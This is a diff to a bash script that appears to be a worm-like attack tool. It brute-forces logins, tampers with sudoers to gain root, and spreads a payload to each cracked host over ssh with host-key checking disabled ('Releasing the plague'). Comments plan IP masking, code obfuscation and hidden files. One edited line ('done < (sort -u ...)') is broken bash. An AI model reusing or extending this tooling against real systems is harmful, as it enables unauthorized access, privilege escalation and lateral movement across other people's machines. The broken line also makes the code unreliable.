@@ -17,12 +17,18 @@
 	# add testing for files and what not to get rid of error spam
 	# multithread. one at a time is dumb
 	# change spectre so it checks if its on attack/cleanup (fuck/unfuck) duty. (loops)
-	# setup multiple levels of complexity of attack (ie altering sshkey file lookup locations)
 	# fix the for loop garbage in the colorizer
 	# auto change mac, send out spoofed IPs, etc
 	# leaave msgs in syslog 'logger'
 	# 'would you like to play a game'
 	# setup params
+	# correct for pre-infected
+	#### multiple levels of attack
+	# masking attacking IP
+	# obfuscating code
+	# hidden file locations
+	# no hints
+	# etc..
 	#******************************************************
 	#
 #///////////////////////////////////////////////////////////////////////////////////////
@@ -32,12 +38,12 @@
 ###############################
 function main(){			###
 	neo						###
-if [[ $1 == "" ]]; then 	### SETUP
+if [[ "$1" == "" ]]; then 	### SETUP
 	meat					###
 	bones					###
 	brute					###
 fi 							###
-if [[ $1 == "a" ]]; then	### ATTACKING
+if [[ "$1" == "a" ]]; then	### ATTACKING
 	b52						###
 fi 							###
 #	spectre					### borked
@@ -263,7 +269,7 @@ function b52(){
 			sudo sed -i "s|$ubuCleanRootPATH|$ubuDirtyRootPATH|" $ubuSecPATHnew
 			sudo chmod 0440 $ubuSecPATHnew
 			# checks that the changes are good
-			visudo -c -f $ubuSecPATHnew
+			visudo -c -f $ubuSecPATHnew > /dev/null
 			# moves the modified file over the old one
 			if [ "$?" -eq "0" ]; then
 			sudo cp $ubuSecPATHnew $ubuSecPATH
@@ -346,11 +352,11 @@ function b52(){
 		case $increment in
 			0)
 					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
-					echo "after case: $attemptNum"
 					echo "increment: $increment"
 					echo "hard drives are big. no need to delete anything.."
 					;;
 			1)
+					clear
 					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
 					printf "\nrude.\nstop that.\n"
 					;;
@@ -421,7 +427,7 @@ while read -r tango; do
 	#jumping into each box and letting loose the plague
 	printf "\nReleasing the plague inside of [$target]\n"
 	ssh -n -o StrictHostKeyChecking=no $target "$(declare -f payload); payload"
-done < $crackedLogins
+done < (sort -u $crackedLogins)
 
 }
 
@@ -712,4 +718,4 @@ done < $crackedLogins
 #+++++++++++++++++++++++++++++++++ FIGHT!! +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
-main
+main $1
